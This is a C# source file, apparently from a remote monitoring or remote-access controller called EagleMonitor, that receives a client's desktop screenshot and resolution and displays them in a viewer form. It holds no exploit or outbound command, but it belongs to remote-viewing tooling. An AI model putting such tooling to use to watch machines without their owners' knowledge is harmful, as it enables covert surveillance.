using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Windows.Forms;

namespace EagleMonitor.PacketParser
{
    internal class RemoteViewerPacketHandler
    {
        public RemoteViewerPacketHandler(RemoteViewerPacket remoteViewerPacket, ClientHandler clientHandler) : base() 
        {
            try
            {
                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.hasAlreadyConnected = true;
                    //ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.viewerPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteViewerPacket.desktopPicture));
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.viewerPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.hResol = remoteViewerPacket.hResol;
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.vResol = remoteViewerPacket.vResol;
                }));
                return;
            }
            catch { }
        }
    }
}
